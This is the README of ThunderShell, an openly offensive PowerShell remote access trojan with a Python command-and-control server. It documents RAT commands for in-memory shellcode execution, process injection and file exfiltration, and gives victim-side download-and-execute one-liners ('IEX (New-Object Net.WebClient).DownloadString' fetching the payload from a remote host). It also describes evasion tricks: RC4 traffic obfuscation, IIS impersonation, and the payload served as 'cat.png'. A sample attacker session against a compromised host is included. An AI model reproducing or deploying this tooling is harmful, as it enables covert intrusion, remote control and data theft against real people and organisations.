# ThunderShell

ThunderShell is a Powershell based RAT that rely on HTTP request to communicate. All the network traffic is encrypted using a second layer of RC4 to avoid SSL interception and defeat network detection on the targeted system. RC4 is a weak cipher and it's only use as obfuscation HTTPS options should be used to provide integrity and strong encryption.

# Dependencies

```
apt install redis-server
apt install mysql-server
apt install python-redis
apt install python-mysqldb
apt install python-tabulate
```

# Logs
Every errors, http requests and commands are logged in the logs folder.

# How it works

The powershell code is executed on the victim. The actual core is written in C#. and use rely on the unmanaged powershell approach to execute each commands. several commands can be run in parallel since the C# code using multi threading. The RAT support several command to speed up the process.

```
Help Menu
=========

Commands    Args            Descriptions
----------  --------------  ------------------------------------------------------------
background                  Return to the main console
fetch       path/url, cmd   In memory execution of a script and execute a command
exec        path/url        In memory execution of code (shellcode)
read        remote path     Read a file on the remote host
upload      path/url, path  Upload a file on the remote system
ps                          List processes
powerless   powershell cmd  Execute Powershell command without invoking Powershell
inject      pid, command    Inject command into a target process (max length 4096)
alias       key, value      Create an alias to avoid typing the same thing over and over
delay       milliseconds    Update the callback delay
help                        show this help menu


List of built in aliases
------------------------
wmiexec                     Remote-WmiExecute utility
searchevent                 Search-EventForUser utility
```

* Fetch Command Flow

```
The server will fetch a resource (path, url) 
        Send the data over the RC4 encrypted channel
                The PowerShell RAT will decrypt the payload 
                        Unmanaged PowerShell Execute the final payload
```

For example if you fetch PowerView.ps1 script it will be fully encrypted over the wire avoiding detection since the server is proxying the request and fully encrypt the data.

# Usage

## Victim
`powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://ringzer0team.com/PS-RemoteShell.ps1');`
 - Make sure that the  `encryption-key` value in your JSON config file match the PowerShell PS-RemoteShell `-Key` option.
 - If you are using https on the ThunderShell server, add the `-Protocol https` attribute to the PowerShell  PS-RemoteShell launcher. 


## Attacker
### Configuration

default.json:
```
{
	"redis-host": "localhost",
	"redis-port": 6379,

	"mysql-host": "localhost",
	"mysql-user": "root",
	"mysql-pass": "",
	"mysql-port": "3306",

	"http-host": "1.1.1.1",
	"http-port": 1111,
	"http-server": "Microsoft-IIS/7.5",
	"http-download-path": "cat.png",
	"http-default-404": "default.html",

	"https-enabled": "off",
	"https-cert-path": "cert.pem",

	"encryption-key": "PleaseChangeMe",
	"max-output-timeout": 5,

	"server-password": "PleaseChangeMe",

	"aliases": {
		"myalias": ""
	},

	"cli-sync-delay": 5
}
```

### HTTPS configuration
If `https-enabled` is `on`, `https-cert-path` must point to a PEM file with this structure:

```
-----BEGIN RSA PRIVATE KEY-----
... (private key in base64 encoding) ...
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
... (certificate in base64 PEM encoding) ...
-----END CERTIFICATE-----
```
### Payload delivery

The `http-download-path` is used to deliver the PowerShell RAT code. It will perform variables renaming by default and will deliver the payload only if the path match the one defined by the `http-download-path` variable.

In this example if the attacker browse to `http://1.1.1.1:8080/cat.png` the web server will return obfuscated version of the RAT:

On your target you can execute the PowerShell script using the following command `IEX (New-Object Net.WebClient).DownloadString("http://1.1.1.1:8080/cat.png");`

### Splash page configuration

You can customize the "error" page that is returned for every GET requests by specifying your HTML template through the `http-default-404` variable. The file need to be placed in the `html` folder and depencies such as images in the `download` folder. By default ThunderShell is mimicking an IIS server and return the default IIS server page.

### Delivering files

Everything that is placed in the `download` folder can be downloaded from the web server:

```
/pathto/ThunderShell/download/payload.sct

http://1.1.1.1:8080/payload.sct
```

### Launching the server
```
me@debian-dev:~$ python ThunderShell.py default.json Mr.Un1k0d3r

Thunder Shell 2.0 | Clients Server CLI
Mr.Un1k0d3r RingZer0 Team 2017
--------------------------------------------------------

[+] Current Active session UUID is 9e3fd04b-3db6-4ceb-9fc1-75fdee2d5ad4


[+] Starting web server on 1.1.1.1 port 1111

[+] Registering new shell 10-R90G3RLC-1GG RingZer0\MrUn1k0d3r
[+] New shell ID 10 GUID is mL3vWfauOgXL1sW0

(10-R90G3RLC-1GG RingZer0\MrUn1k0d3r)>>> whoami

(10-R90G3RLC-1GG RingZer0\MrUn1k0d3r)>>>
[+] [(CLI)Mr.Un1k0d3r] Sending command: whoami

[*] Command output:
RingZer0\MrUn1k0d3r

(10-R90G3RLC-1GG RingZer0\MrUn1k0d3r)>>> help

Help Menu
=========

Commands    Args            Descriptions
----------  --------------  ------------------------------------------------------------
background                  Return to the main console
fetch       path/url, cmd   In memory execution of a script and execute a command
exec        path/url        In memory execution of code (shellcode)
read        remote path     Read a file on the remote host
upload      path/url, path  Upload a file on the remote system
ps                          List processes
powerless   powershell cmd  Execute Powershell command without invoking Powershell
inject      pid, command    Inject command into a target process (max length 4096)
alias       key, value      Create an alias to avoid typing the same thing over and over
delay       milliseconds    Update the callback delay
help                        show this help menu


List of built in aliases
------------------------
wmiexec                     Remote-WmiExecute utility
searchevent                 Search-EventForUser utility


List user defined aliases
--------------------------

(10-R90G3RLC-1GG RingZer0\MrUn1k0d3r)>>> background
(Main)>>> list full

List of active shells
---------------------

  5     10-R90G3RLC-1GG RingZer0\MrUn1k0d3r MbDYqaoA6QhlMYRg last seen 06/12/2018 14:53:10
  8     10-R90G3RLC-1GG RingZer0\MrUn1k0d3r coyJ4UNIhgJj08Yh last seen 06/12/2018 15:04:49
  6     10-R90G3RLC-1GG RingZer0\MrUn1k0d3r 8jakdrGo3U6NA6eV last seen 06/12/2018 14:53:31
  10    10-R90G3RLC-1GG RingZer0\MrUn1k0d3r mL3vWfauOgXL1sW0 last seen 08/12/2018 13:57:39
  
(Main)>>> interact 10 

# Todo

* Implement in memory protection using C#
* Implement different delivery methods
* Inject the PowerShell RAT into another process

# Credit 
Mr.Un1k0d3r RingZer0 Team 2017
